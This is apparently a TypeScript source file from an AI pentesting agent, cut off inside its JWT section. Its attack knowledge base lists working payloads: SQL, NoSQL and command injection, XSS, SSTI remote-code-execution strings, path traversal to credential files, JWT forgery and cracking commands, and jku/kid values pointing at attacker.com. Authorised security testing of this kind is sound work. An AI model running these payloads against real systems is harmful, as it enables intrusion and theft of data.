import { tool } from "ai";
import { z } from "zod";
import { exec } from "child_process";
import { promisify } from "util";
import {
  writeFileSync,
  appendFileSync,
  readdirSync,
  readFileSync,
  existsSync,
} from "fs";
import { join } from "path";
import type { Session } from "./sessions";
import { getOffensiveHeaders } from "./sessions";
import { RateLimiter } from '../services/rateLimiter';
import { runAgent } from "./pentestAgent";
import type { AIModel } from "../ai";
import { generateObjectResponse } from "../ai";
import { getProviderModel } from "../ai/utils";
import { generateText } from "ai";

const execAsync = promisify(exec);

// Schemas for AI-generated structured outputs
const PayloadSchema = z.object({
  payload: z.string(),
  reasoning: z.string(),
  technique: z.string(),
});

const AnalysisSchema = z.object({
  vulnerable: z.boolean(),
  confidence: z.enum(["high", "medium", "low"]),
  reasoning: z.string(),
  certainlyNotVulnerable: z.boolean(),
  suggestedNextTest: z.string(),
});

/**
 * Attack Knowledge Base
 *
 * Contains expert knowledge about attack types, techniques, and detection
 * indicators to guide AI in generating contextual tests.
 */
const ATTACK_KNOWLEDGE = {
  graphql_injection: {
    name: "GraphQL Injection",
    description: "Exploits insufficient input validation in GraphQL queries to inject malicious queries/mutations",
    objective: "Access unauthorized data, expose API structure, or execute unintended operations",
    techniques: [
      {
        name: "Schema Introspection Injection",
        how: "Inject __schema queries to expose complete API structure",
        context: "When GraphQL introspection is enabled and input isn't properly validated",
        example: "Inject '} { __schema { types { name } } }' to break out and query schema"
      },
      {
        name: "Query Injection",
        how: "Break out of parameter context to inject unauthorized queries",
        context: "When user input is embedded in queries without proper parameterization",
        example: "Use '} { users { password email } }' to inject data-accessing queries"
      },
      {
        name: "Mutation Injection",
        how: "Inject mutations to modify or delete data",
        context: "When mutations are accessible without authorization checks",
        example: "Inject 'mutation { deleteUser(id: 1) }' or similar data-modifying operations"
      },
      {
        name: "Newline-based Injection",
        how: "Use newline characters to bypass basic input validation",
        context: "When basic string matching is used for filtering",
        example: "Use '\n__schema' or '\n' + 'query' to bypass simple filters"
      }
    ],
    indicators: {
      vulnerable: [
        "GraphQL schema structure appears in response (__schema, types, fields)",
        "Unauthorized query successfully executes",
        "Extra data fields that shouldn't be accessible",
        "Error messages revealing query structure or field names",
        "Response contains data from injected query"
      ],
      notVulnerable: [
        "Input validation error (e.g., 'Invalid characters')",
        "Parameterized query protection (input treated as string literal)",
        "Proper escaping applied",
        "GraphQL syntax error from the server (query treated as data)",
        "Authorization error (query parsed but blocked)"
      ]
    },
    adaptiveStrategy: "Start with schema introspection to test if injection is possible. If successful, enumerate available fields. Then test for unauthorized data queries based on discovered schema. Try newline bypasses if basic tests fail."
  },

  sql_injection: {
    name: "SQL Injection",
    description: "Exploits insufficient input sanitization in SQL queries",
    objective: "Bypass authentication, access/modify data, or execute commands",
    techniques: [
      {
        name: "Boolean-based Blind",
        how: "Use boolean conditions to infer data through application behavior",
        context: "When direct output isn't visible but application behavior changes",
        example: "' OR '1'='1 makes condition always true, ' OR '1'='2 makes it false"
      },
      {
        name: "Union-based",
        how: "Use UNION to combine results from multiple queries",
        context: "When query results are displayed in the application",
        example: "' UNION SELECT username,password FROM users-- to extract data"
      },
      {
        name: "Time-based Blind",
        how: "Use database sleep functions to infer conditions",
        context: "When no visible output changes occur",
        example: "' AND SLEEP(5)-- causes 5 second delay if vulnerable"
      },
      {
        name: "Error-based",
        how: "Trigger SQL errors to extract information",
        context: "When database errors are displayed",
        example: "' to cause syntax error revealing database structure"
      }
    ],
    indicators: {
      vulnerable: [
        "SQL syntax errors in response",
        "Database error messages (MySQL, PostgreSQL, MSSQL errors)",
        "Authentication bypass (logged in without valid credentials)",
        "Time delays matching SLEEP commands",
        "Extra rows or columns in results",
        "UNION query successful"
      ],
      notVulnerable: [
        "Parameterized query protection (input treated as literal)",
        "Input rejected with validation error",
        "No behavioral changes with SQL metacharacters",
        "WAF or input filter blocking"
      ]
    },
    adaptiveStrategy: "Start with single quote to test SQL context. If error, try boolean-based bypass. If successful, attempt UNION for data extraction. Fallback to time-based if no visible output."
  },

  nosql_injection: {
    name: "NoSQL Injection",
    description: "Exploits insufficient input validation in NoSQL database queries (MongoDB, CouchDB, etc.)",
    objective: "Bypass authentication, access unauthorized data, or modify database queries",
    techniques: [
      {
        name: "Operator Injection",
        how: "Inject NoSQL operators like $ne, $gt, $regex to manipulate queries",
        context: "When user input is directly used in NoSQL query objects",
        example: '{"username": "admin", "password": {"$ne": ""}} bypasses authentication'
      },
      {
        name: "JavaScript Injection",
        how: "Inject JavaScript code in $where clauses",
        context: "When $where operator is used with user input",
        example: '{"$where": "this.username == \'admin\' || 1==1"} to bypass logic'
      },
      {
        name: "Array Injection",
        how: "Send arrays instead of strings to manipulate query logic",
        context: "When query parsers accept arrays as operator syntax",
        example: "username=admin&password[$ne]=wrong as query parameters"
      }
    ],
    indicators: {
      vulnerable: [
        "Authentication bypass with operator injection",
        "Unexpected data returned",
        "MongoDB/NoSQL error messages",
        "Successful $where clause execution",
        "Query logic manipulation"
      ],
      notVulnerable: [
        "Input type validation",
        "Operator filtering",
        "Parameterized queries",
        "Strict schema validation"
      ]
    },
    adaptiveStrategy: "Test operator injection first ($ne, $gt). If JSON POST, try object injection. For query parameters, try array notation. Check for JavaScript injection in $where if applicable."
  },

  xss_reflected: {
    name: "Reflected Cross-Site Scripting (XSS)",
    description: "Injecting malicious scripts that execute in victim's browser",
    objective: "Execute JavaScript in victim's browser context",
    techniques: [
      {
        name: "Basic Script Injection",
        how: "Inject <script> tags directly",
        context: "When output isn't HTML-escaped",
        example: "<script>alert(1)</script>"
      },
      {
        name: "Event Handler Injection",
        how: "Use HTML event handlers like onerror, onload",
        context: "When <script> is filtered but other tags aren't",
        example: "<img src=x onerror=alert(1)>"
      },
      {
        name: "Attribute Breakout",
        how: "Break out of HTML attributes to inject tags",
        context: "When input is reflected inside HTML attributes",
        example: '"><script>alert(1)</script>'
      }
    ],
    indicators: {
      vulnerable: [
        "Script tags present in response HTML",
        "Event handlers in response",
        "JavaScript protocol in hrefs",
        "Unescaped user input in HTML"
      ],
      notVulnerable: [
        "HTML entity encoding applied",
        "Content Security Policy blocking",
        "Input sanitization",
        "Output escaping"
      ]
    },
    adaptiveStrategy: "Try basic script tag first. If filtered, try event handlers. Check for attribute context. Test various encoding bypasses."
  },

  command_injection: {
    name: "Command Injection",
    description: "Executing arbitrary system commands through vulnerable application",
    objective: "Execute system commands on the server",
    techniques: [
      {
        name: "Command Chaining",
        how: "Use semicolon to chain commands",
        context: "When input is passed to system shell",
        example: "; whoami or ; cat /etc/passwd"
      },
      {
        name: "Pipe Injection",
        how: "Use pipe operator to redirect output",
        context: "When command output is processed",
        example: "| whoami"
      },
      {
        name: "Subshell Injection",
        how: "Use backticks or $() for command substitution",
        context: "When shell interprets special characters",
        example: "`whoami` or $(cat /etc/passwd)"
      }
    ],
    indicators: {
      vulnerable: [
        "Command output in response",
        "System information leaked",
        "Delayed response from sleep commands",
        "Error messages from system commands"
      ],
      notVulnerable: [
        "Input sanitization",
        "Parameterized command execution",
        "Shell metacharacter filtering",
        "Restricted execution environment"
      ]
    },
    adaptiveStrategy: "Test command chaining first. Try different separators (;, |, &). Use output detection commands like whoami, id. Fallback to time-based with sleep if no output visible."
  },

  idor: {
    name: "Insecure Direct Object Reference (IDOR)",
    description: "Accessing unauthorized objects by manipulating references",
    objective: "Access other users' data or unauthorized resources",
    techniques: [
      {
        name: "Sequential ID Manipulation",
        how: "Change numeric IDs to access other resources",
        context: "When authorization isn't checked on ID-based endpoints",
        example: "Change /user/123 to /user/124 to access other user's data"
      },
      {
        name: "UUID Enumeration",
        how: "Try predictable or enumerable UUIDs",
        context: "When UUIDs are sequential or guessable",
        example: "Test sequential UUIDs or common patterns"
      }
    ],
    indicators: {
      vulnerable: [
        "Different user's data returned",
        "Unauthorized resource access",
        "No authorization check on resource access"
      ],
      notVulnerable: [
        "Authorization error (403 Forbidden)",
        "Not Found for unauthorized IDs",
        "Proper access control checks"
      ]
    },
    adaptiveStrategy: "Identify current user's ID, then test sequential IDs (±1, ±10). Check if different user data is returned. Test CRUD operations on other IDs."
  },

  business_logic: {
    name: "Business Logic Vulnerabilities",
    description: "Exploiting flaws in application's business logic",
    objective: "Manipulate prices, quantities, workflows, or bypass business rules",
    techniques: [
      {
        name: "Price Manipulation",
        how: "Modify price parameters to negative or zero",
        context: "When client-side price values are trusted",
        example: "Set price=-100 or price=0.01"
      },
      {
        name: "Quantity Manipulation",
        how: "Use negative quantities or overflow values",
        context: "When quantity validation is insufficient",
        example: "quantity=-1 or quantity=999999999"
      },
      {
        name: "Workflow Bypass",
        how: "Skip required steps in multi-step processes",
        context: "When step validation isn't enforced",
        example: "Go directly to /checkout without /payment"
      }
    ],
    indicators: {
      vulnerable: [
        "Negative prices accepted",
        "Zero-cost orders processed",
        "Steps can be skipped",
        "Race conditions exploitable"
      ],
      notVulnerable: [
        "Server-side price validation",
        "Workflow state management",
        "Proper business rule enforcement"
      ]
    },
    adaptiveStrategy: "Identify business-critical parameters. Test negative values, zero values, and overflows. Check workflow sequence enforcement."
  },

  methodology: {
    systematic_discovery: {
      name: "Systematic Attack Surface Discovery",
      description: "Complete attack surface mapping before vulnerability testing - professional pentesting methodology",
      objective: "Discover ALL endpoints, parameters, forms, APIs before testing any vulnerabilities",

      principle: "Test everything you find, find everything before testing",

      phases: [
        {
          phase: "Discovery Phase",
          goal: "Map complete attack surface",
          activities: [
            "Enumerate all endpoints (don't test yet)",
            "Identify all parameters (don't test yet)",
            "Map all forms and inputs (don't test yet)",
            "Document all APIs and versions (don't test yet)"
          ],
          completion_criteria: "No new endpoints discovered for 3+ attempts"
        },
        {
          phase: "Testing Phase",
          goal: "Systematically test each discovered element",
          activities: [
            "Test each endpoint against relevant vulnerability classes",
            "Test each parameter with appropriate payloads",
            "Record ALL results (vulnerable AND safe)",
            "Use test_parameter for systematic testing"
          ],
          completion_criteria: "All discovered elements have test results recorded"
        },
        {
          phase: "Validation Phase",
          goal: "Verify completeness before reporting",
          activities: [
            "Check coverage: Tested X/X endpoints?",
            "Check coverage: Tested Y/Y parameters?",
            "Investigated all errors/anomalies?",
            "Would professional pentester consider this complete?"
          ],
          completion_criteria: "check_testing_coverage shows >90% coverage"
        }
      ],

      discovery_strategies: {
        endpoint_enumeration: {
          when: "Always - before testing any vulnerabilities",
          how: [
            "1. Crawl homepage for links and patterns",
            "2. If pattern detected (/xss1, /api/v1), enumerate full range",
            "3. Test common paths: /admin, /api, /login, /user, /settings",
            "4. Extract endpoints from JavaScript files",
            "5. Try HTTP methods: GET, POST, PUT, DELETE, OPTIONS",
            "6. Don't stop until no new endpoints found"
          ],
          tools: ["enumerate_endpoints", "curl", "grep", "JavaScript analysis"],
          validation: "Can you find any endpoint you haven't documented?"
        },

        parameter_identification: {
          when: "For each discovered endpoint",
          how: [
            "1. Identify all parameters in URL (query params)",
            "2. Identify all parameters in request body",
            "3. Identify hidden form fields",
            "4. Check for parameters in headers (cookies, custom headers)",
            "5. Review JavaScript for API calls with parameters"
          ],
          validation: "Did you document every way to send data to this endpoint?"
        },

        error_investigation: {
          when: "For ANY non-200 response",
          how: [
            "404: Try trailing slash, different methods, with parameters",
            "500: Check Docker logs, look for stack traces, try parameters",
            "403: Try auth bypass, parameter manipulation, different methods",
            "400: Try different content types, check required parameters"
          ],
          principle: "Every response is data - investigate everything",
          validation: "Did I understand WHY this endpoint behaved this way?"
        }
      },

      completeness_checks: [
        "Have I discovered all endpoints? (Try 10+ more patterns - anything new?)",
        "Have I tested all discovered endpoints? (Check coverage report)",
        "Have I investigated all anomalies? (Any unexplained 404/500?)",
        "Would I stake my reputation this is complete? (Professional standard)"
      ],

      anti_patterns: [
        "❌ Find endpoint → Test immediately → Move on",
        "❌ Get 404 → Assume doesn't exist → Skip",
        "❌ Find one vuln → Report → Done",
        "❌ Test 5 endpoints → Claim 'comprehensive assessment'",
        "✅ Discover ALL → Test ALL → Validate coverage → Report"
      ],

      indicators: {
        systematic_approach: [
          "Documented endpoint discovery attempts (3+)",
          "Complete endpoint list before testing",
          "All parameters identified per endpoint",
          "Coverage validation before reporting",
          "All errors investigated, not skipped"
        ],
        opportunistic_approach: [
          "Testing started without full discovery",
          "Endpoints tested as found (no complete list)",
          "Errors skipped without investigation",
          "Report generated without coverage check",
          "Premature conclusion of testing"
        ]
      },

      adaptiveStrategy: "Phase 1: Enumerate until no new findings (3+ attempts). Phase 2: Test all discovered elements systematically. Phase 3: Validate >90% coverage before reporting. Never test before discovery is complete. Never report before validation is complete."
    }
  },

  ssti: {
    name: "Server-Side Template Injection (SSTI)",
    description: "Exploits unsafe template rendering where user input is embedded in templates without sanitization",
    objective: "Execute arbitrary code on server, access sensitive configuration, achieve RCE",

    templateEngines: {
      jinja2: {
        framework: "Python (Flask/Django)",
        detection: "{{7*7}} → Returns '49'",
        testPayload: "{{7*7}}",
        configAccess: "{{config}}",
        classExploration: "{{''.__class__.__mro__[1].__subclasses__()}}",
        rce: "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        indicators: ["49 in response", "Configuration object visible", "Class listings", "Command output"]
      },
      twig: {
        framework: "PHP (Symfony)",
        detection: "{{7*7}} → Returns '49'",
        testPayload: "{{7*7}}",
        configAccess: "{{_self.env}}",
        rce: "{{['id']|map('system')|join}}",
        indicators: ["49 in response", "Environment object", "System command output"]
      },
      smarty: {
        framework: "PHP",
        detection: "{7*7} → Returns '49'",
        testPayload: "{7*7}",
        rce: "{system('id')}",
        phpExec: "{php}echo `id`;{/php}",
        indicators: ["49 in response", "Command output", "PHP execution"]
      },
      freemarker: {
        framework: "Java",
        detection: "${7*7} → Returns '49'",
        testPayload: "${7*7}",
        classAccess: "${product.getClass()}",
        rce: "<#assign ex='freemarker.template.utility.Execute'?new()> ${ex('id')}",
        indicators: ["49 in response", "Java class names visible", "Command output"]
      },
      erb: {
        framework: "Ruby (Rails)",
        detection: "<%= 7*7 %> → Returns '49'",
        testPayload: "<%= 7*7 %>",
        rce: "<%= system('id') %>",
        fileRead: "<%= File.read('/etc/passwd') %>",
        dirList: "<%= Dir.entries('/') %>",
        indicators: ["49 in response", "System output", "File contents", "Directory listings"]
      }
    },

    techniques: [
      {
        name: "Math Expression Detection",
        how: "Inject template math expressions to test if evaluation occurs",
        context: "First step - determines if template injection is possible",
        payloads: ["{{7*7}}", "${7*7}", "{7*7}", "<%= 7*7 %>"],
        successIndicator: "Response contains '49'",
        example: "Test {{7*7}} in name parameter - if response shows '49', SSTI confirmed"
      },
      {
        name: "Config/Environment Access",
        how: "Access template engine's config or environment objects",
        context: "After confirming evaluation, escalate to data access",
        payloads: {
          jinja2: "{{config}}",
          twig: "{{_self.env}}",
          freemarker: "${.data_model}"
        },
        example: "{{config}} in Jinja2 exposes Flask application configuration"
      },
      {
        name: "RCE via Template Functions",
        how: "Use template built-in functions to execute system commands",
        context: "Final escalation to remote code execution",
        payloads: {
          jinja2: "{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}",
          twig: "{{['whoami']|map('system')|join}}",
          smarty: "{system('whoami')}",
          freemarker: "<#assign ex='freemarker.template.utility.Execute'?new()> ${ex('whoami')}",
          erb: "<%= system('whoami') %>"
        },
        example: "Jinja2 RCE through config object and os module access"
      },
      {
        name: "Blind SSTI - Time-Based",
        how: "Use sleep/delay functions when no visible output",
        context: "When template output isn't directly visible",
        payloads: {
          jinja2: "{{''.__class__.__mro__[1].__subclasses__()[396]('sleep 5',shell=True)}}",
          php: "{{system('sleep 5')}}"
        },
        successIndicator: "Response delayed by 5+ seconds",
        example: "Inject sleep command and measure response time"
      },
      {
        name: "Blind SSTI - Error-Based",
        how: "Trigger template errors to confirm injection",
        context: "When no output reflection but errors visible",
        payloads: ["{{invalid_syntax}}", "${undefined_var}", "{malformed"],
        successIndicator: "Template engine error message in response",
        example: "{{invalid}} triggers 'TemplateSyntaxError' revealing Jinja2"
      },
      {
        name: "Multi-Step Form SSTI",
        how: "Inject payload in step 1, check if executed in step 3",
        context: "Registration forms where name is rendered later",
        workflow: [
          "1. Submit {{7*7}} in registration step 1 'name' field",
          "2. Continue through step 2",
          "3. Check step 3 greeting - if shows 'Welcome, 49!' → SSTI confirmed"
        ],
        example: "Name from step1 rendered in step3 confirmation without sanitization"
      }
    ],

    testingWorkflow: [
      "1. Identify user input rendered in pages (names, messages, titles, bios, subjects)",
      "2. Test ALL template syntaxes: {{7*7}}, ${7*7}, {7*7}, <%= 7*7 %>",
      "3. Check response for '49' - if found, SSTI confirmed",
      "4. Identify template engine from syntax that worked or error messages",
      "5. Test in ALL parameters, not just obvious ones (test hidden fields, headers)",
      "6. For multi-step forms: inject in step 1, check rendering in later steps",
      "7. If blind: use time-based (sleep commands) or error-based detection",
      "8. Once confirmed, escalate to config access",
      "9. Finally attempt RCE with engine-specific payloads",
      "10. Create POC demonstrating code execution"
    ],

    highRiskParameters: [
      "name", "username", "firstname", "lastname", "displayname",
      "title", "subject", "heading",
      "message", "comment", "feedback", "description", "bio",
      "template", "theme", "layout", "view",
      "email", "email_body", "email_subject",
      "content", "body", "text", "note", "memo"
    ],

    highRiskContexts: [
      "Registration/profile pages (name rendered in greetings/confirmations)",
      "Contact forms (message rendered in confirmation email or admin panel)",
      "Email templates (user input in email subject or body)",
      "Error pages (user input echoed in custom error messages)",
      "Multi-step forms (data from step 1 rendered in step 3 without escaping)",
      "Admin panels (custom messages, labels, notification templates)",
      "Blog/CMS systems (post titles, author names, custom templates)",
      "Search result pages (search query reflected in results page)",
      "User-generated content displays (bios, signatures, profile descriptions)"
    ],

    indicators: {
      vulnerable: [
        "Math expression evaluated (7*7 returns '49' not literal string)",
        "Template objects accessible (config, request, self, env visible)",
        "Class hierarchy exposed via templates",
        "Template syntax errors with code context visible",
        "Command execution successful (whoami output in response)",
        "Time delays matching sleep commands (blind detection)",
        "Environment variables or config exposed",
        "File contents readable via template functions",
        "Template engine name in error messages (Jinja2, Twig, etc.)"
      ],
      notVulnerable: [
        "Template syntax treated as literal string ('{{7*7}}' displayed as-is)",
        "Input properly escaped/sanitized (HTML entities applied)",
        "Sandbox restrictions preventing code execution",
        "Template engine in safe/restricted mode",
        "No template evaluation of user input",
        "Parameterized templates with proper separation",
        "Input validation blocking template syntax",
        "WAF or filter blocking template payloads"
      ]
    },

    adaptiveStrategy: `
Round 1: Detection across all syntaxes
- Try {{7*7}}, \${7*7}, {7*7}, <%= 7*7 %> on EVERY user input parameter
- Test in ALL fields: name, email, message, title, subject, bio, description
- For multi-step forms, inject in step 1 and check rendering in step 2/3
- Look for '49' in response or template engine errors
- Identify which syntax worked to determine template engine

Round 2: Escalation if detected
- If math works, try config/environment access based on detected engine
- Jinja2: {{config}}, {{request}}, {{''.__class__}}
- Twig: {{_self.env}}, {{app}}
- Smarty: {$smarty.version}
- FreeMarker: \${.data_model}
- ERB: <%= Rails.version %>
- Look for exposed configuration or environment data

Round 3: RCE attempt or blind detection
- If config accessible, attempt engine-specific RCE payloads
- Jinja2: Use __class__.__init__.__globals__ to access os module
- Twig: Use |map('system') filter
- Smarty: Use {php} tags or {system()}
- FreeMarker: Use Execute utility class
- ERB: Use system() or backticks
- If no visible output, try time-based: inject sleep command, measure response time
- If still uncertain, try error-based: inject invalid syntax, check for engine errors

CRITICAL: Test ALL input fields, especially those rendered in:
- Greetings (Welcome, {{name}}!)
- Confirmations (Thank you, {{name}}, your message was sent)
- Email subjects/bodies (Re: {{subject}})
- Error messages (Error processing {{input}})
- Admin notifications (New user {{name}} registered)

Don't just test obvious fields - templates can be anywhere user input is rendered!
    `
  },

  path_traversal: {
    name: "Path Traversal / Local File Inclusion (LFI)",
    description: "Exploits insufficient input validation in file path operations to read arbitrary files",
    objective: "Read sensitive files (/etc/passwd, config files, source code, credentials)",

    parameterPatterns: [
      "file", "path", "document", "doc", "page", "template", "resource",
      "pdf", "include", "load", "read", "download", "view", "display",
      "filename", "filepath", "location", "dir", "folder", "directory",
      "source", "src", "url", "uri", "get", "fetch", "show", "open"
    ],

    techniques: [
      {
        name: "Basic Traversal",
        how: "Use ../ sequences to navigate up directories",
        context: "First test - works if no validation",
        payloads: [
          "../../../etc/passwd",
          "../../../../etc/passwd",
          "../../../../../etc/passwd",
          "../../../../../../etc/passwd"
        ],
        example: "../../../etc/passwd accesses /etc/passwd from 3 levels deep"
      },
      {
        name: "URL Encoding Bypass",
        how: "Encode ../ as %2e%2e%2f to bypass filters",
        context: "When basic traversal blocked by string matching",
        payloads: [
          "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
          "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini"
        ],
        example: "%2e%2e%2f bypasses filters that only check for literal '../'"
      },
      {
        name: "Double Encoding Bypass",
        how: "Double-encode to bypass decoding filters",
        context: "When single encoding blocked",
        payloads: [
          "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
          "%252e%252e%255c%252e%252e%255cwindows%255cwin.ini"
        ],
        example: "%252e = encoded '%2e' which decodes to '.'"
      },
      {
        name: "Null Byte Injection",
        how: "Use %00 to truncate expected file extensions",
        context: "When application appends .pdf, .txt, .html",
        payloads: [
          "../../../etc/passwd%00",
          "../../../etc/passwd%00.pdf",
          "../../../etc/passwd%00.txt"
        ],
        example: "../../../etc/passwd%00.pdf - null byte truncates .pdf"
      },
      {
        name: "Absolute Path Access",
        how: "Use absolute paths instead of relative",
        context: "When traversal sequences filtered",
        payloads: [
          "/etc/passwd",
          "/etc/shadow",
          "C:\\windows\\win.ini",
          "/var/www/html/config.php"
        ],
        example: "/etc/passwd directly accesses absolute path"
      },
      {
        name: "Windows Path Separators",
        how: "Use backslashes for Windows systems",
        context: "When / is filtered but \\\\ isn't",
        payloads: [
          "..\\..\\..\\windows\\win.ini",
          "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
          "C:\\windows\\win.ini"
        ],
        example: "..\\\\..\\\\ uses Windows path separators"
      },
      {
        name: "Protocol Wrappers (PHP)",
        how: "Use PHP wrappers to access files",
        context: "PHP applications with wrapper support",
        payloads: [
          "php://filter/convert.base64-encode/resource=index.php",
          "file:///etc/passwd",
          "php://filter/resource=/etc/passwd",
          "expect://id",
          "data://text/plain;base64,SSBsb3ZlIFBIUAo="
        ],
        example: "php://filter/convert.base64-encode reveals source code"
      },
      {
        name: "Mixed Encoding",
        how: "Mix different encodings to confuse filters",
        context: "Advanced bypass when multiple filters exist",
        payloads: [
          "..%2F..%2F../etc/passwd",
          "%2e%2e/..%2F../etc/passwd",
          "..\\%2F..%5c../etc/passwd"
        ],
        example: "Mix literal and encoded characters to bypass regex"
      }
    ],

    targetFiles: {
      linux: [
        "/etc/passwd",
        "/etc/shadow",
        "/etc/hosts",
        "/proc/self/environ",
        "/proc/version",
        "/proc/self/cmdline",
        "/var/log/apache2/access.log",
        "/var/log/nginx/access.log",
        "/home/user/.ssh/id_rsa",
        "/root/.bash_history",
        "/var/www/html/config.php"
      ],
      windows: [
        "C:\\windows\\win.ini",
        "C:\\windows\\system32\\drivers\\etc\\hosts",
        "C:\\boot.ini",
        "C:\\inetpub\\wwwroot\\web.config",
        "C:\\xampp\\apache\\conf\\httpd.conf",
        "C:\\windows\\system.ini"
      ],
      application: [
        "config.php",
        "config.py",
        "settings.py",
        ".env",
        "application.properties",
        "database.yml",
        "credentials.json",
        "secrets.yml",
        "wp-config.php",
        ".git/config",
        "composer.json",
        "package.json"
      ]
    },

    testingWorkflow: [
      "1. Identify ALL file-related parameters (not just 'file')",
      "2. Detect OS (Linux vs Windows) from headers/errors/server signatures",
      "3. Test basic ../ traversal with multiple depths (3, 5, 7, 10 levels)",
      "4. If blocked, try URL encoding: %2e%2e%2f",
      "5. If still blocked, try double encoding: %252e%252e%252f",
      "6. Try null byte injection: ../../../etc/passwd%00",
      "7. Try absolute paths: /etc/passwd or C:\\\\windows\\\\win.ini",
      "8. Test both / and \\\\ path separators",
      "9. For PHP: try protocol wrappers (file://, php://filter/)",
      "10. Target high-value files: /etc/passwd, config files, .env",
      "11. Test every file parameter found, not just the obvious ones"
    ],

    indicators: {
      vulnerable: [
        "File contents in response (root:x:0:0 from /etc/passwd)",
        "Windows system file contents ([fonts] from win.ini)",
        "Error messages revealing file paths",
        "Source code disclosure (PHP, Python, etc.)",
        "Configuration file contents (.env, config.php)",
        "Log file contents",
        "Base64 encoded file contents (PHP filter wrapper)",
        "Environment variables from /proc/self/environ",
        "SSH keys or credentials in response",
        "Stack traces showing file system structure"
      ],
      notVulnerable: [
        "Input validation error ('Invalid characters detected')",
        "Path normalized by application (dots removed)",
        "Chroot/sandbox restrictions in place",
        "File not found after trying all bypasses",
        "Access denied errors (but endpoint exists)",
        "Whitelist validation blocking traversal",
        "Empty response for all traversal attempts"
      ]
    },

    adaptiveStrategy: `
Round 1: Detection & Basic Traversal
- Test ../../../etc/passwd with increasing depths (3, 5, 7, 10 levels)
- Also test /etc/passwd (absolute path)
- Check for file contents or path-related errors
- Look for "root:x:0:0" or "[fonts]" in response

Round 2: Encoding Bypasses
- If Round 1 blocked, try URL encoding: %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
- Try double encoding: %252e%252e%252f%252e%252e%252fetc%252fpasswd
- Try null byte: ../../../etc/passwd%00
- Mix encodings: ..%2F..%2F../etc/passwd

Round 3: Advanced Techniques
- Try Windows paths if Linux failed: ..\\\\..\\\\..\\\\windows\\\\win.ini
- Try protocol wrappers: file:///etc/passwd, php://filter/convert.base64-encode/resource=index.php
- Try absolute paths with different targets: /var/www/html/config.php, /proc/self/environ
- Test with different target files (config.php, .env, web.config)

CRITICAL: Test ALL parameters that might handle files:
- Obvious: file, path, document, page
- Subtle: resource, view, template, load, src, url
- Hidden: Any parameter used in file operations
    `
  },

  jwt_vulnerabilities: {
    name: "JWT (JSON Web Token) Vulnerabilities",
    description: "Exploits weak JWT implementations allowing token forgery, signature bypass, or algorithm confusion",
    objective: "Forge tokens, bypass authentication, escalate privileges, manipulate user identity",

    jwtStructure: "header.payload.signature (all base64url encoded)",

    tokenLocations: [
      "Authorization: Bearer <token>",
      "Cookie: jwt=<token>",
      "Cookie: auth=<token>",
      "Cookie: session=<token>",
      "X-Auth-Token: <token>",
      "X-Access-Token: <token>"
    ],

    techniques: [
      {
        name: "None Algorithm Attack",
        how: "Change alg header to 'none', remove signature",
        context: "Some implementations accept unsigned tokens",
        steps: [
          "1. Decode JWT: echo '<token>' | base64 -d",
          "2. Change header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
          "3. Modify payload: change user_id, role, etc.",
          "4. Encode header + payload, remove signature",
          "5. Send: header.payload. (note trailing dot)"
        ],
        example: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJyb2xlIjoiYWRtaW4ifQ."
      },
      {
        name: "Algorithm Confusion (RS256→HS256)",
        how: "Change algorithm from RS256 to HS256",
        context: "Server may verify HS256 with public key as secret",
        steps: [
          "1. Get public key from /jwks.json or /.well-known/jwks.json",
          "2. Change alg from RS256 to HS256 in header",
          "3. Sign token using public key as HMAC secret",
          "4. Server verifies with same public key (HMAC instead of RSA)"
        ],
        example: "Public key used as HMAC secret instead of RSA verification"
      },
      {
        name: "Weak Secret Brute Force",
        how: "Crack JWT secret using dictionary attack",
        context: "When HS256/HS512 uses weak secret",
        tools: [
          "jwt_tool: jwt_tool <token> -C -d /path/to/wordlist",
          "hashcat: hashcat -m 16500 jwt.txt wordlist.txt",
          "john: john --wordlist=wordlist.txt jwt.txt"
        ],
        commonSecrets: [
          "secret", "password", "123456", "qwerty",
          "key", "jwt_secret", "your-256-bit-secret"
        ],
        example: "If secret is 'secret', token can be forged"
      },
      {
        name: "Payload Manipulation Without Re-signing",
        how: "Modify payload without changing signature",
        context: "When signature not verified",
        steps: [
          "1. Decode JWT payload",
          "2. Change user_id: 1 → 2",
          "3. Change role: user → admin",
          "4. Re-encode payload",
          "5. Keep original signature",
          "6. Send modified token"
        ],
        example: "Change user_id without re-signing to access other user's data"
      },
      {
        name: "JWT Injection in Kid Parameter",
        how: "Inject malicious values in 'kid' (key ID) header",
        context: "When kid used to fetch signing key from filesystem or URL",
        payloads: [
          "{\"kid\": \"/etc/passwd\"}",
          "{\"kid\": \"../../../../etc/passwd\"}",
          "{\"kid\": \"http://attacker.com/malicious-key\"}",
          "{\"kid\": \"/dev/null\"}"
        ],
        example: "kid: /dev/null causes verification with empty key"
      },
      {
        name: "JWT Header Injection",
        how: "Add malicious parameters to JWT header",
        context: "When application processes custom header parameters",
        payloads: [
          "{\"jku\": \"http://attacker.com/jwks.json\"}",
          "{\"x5u\": \"http://attacker.com/cert.pem\"}",
          "{\"x5c\": [\"attacker-cert\"]}"
        ],
        example: "jku points to attacker-controlled JWKS to provide signing key"
      }
    ],

    testingWorkflow: [
      "1. Intercept JWT token from login/auth response or cookies",
      "2. Decode JWT: echo '<token>' | base64 -d or use jwt.io",
      "3. Note current algorithm (alg), user_id, role, exp, etc.",
      "4. TEST 1: Change alg to 'none', remove signature (header.payload.)",
      "5. TEST 2: Modify payload (change user_id/role), keep signature",
      "6. TEST 3: Change alg from RS256 to HS256 (if RS256)",
      "7. TEST 4: Try common secrets with jwt_tool or hashcat",
      "8. TEST 5: Modify kid parameter in header (path traversal)",
      "9. TEST 6: Try jku/x5u header injection",
      "10. For each test, send modified token and check if accepted"
    ],

    tools: [
      "jwt_tool: Automated JWT testing - jwt_tool <token> -M at",
      "jwt.io: Online JWT decoder/encoder",
      "hashcat: For brute forcing secrets - hashcat -m 16500",
      "Burp Suite: JWT Editor extension",
      "Command: echo 'token' | cut -d. -f2 | base64 -d"
    ],

    indicators: {
      vulnerable: [
        "Token with alg:'none' accepted by application",
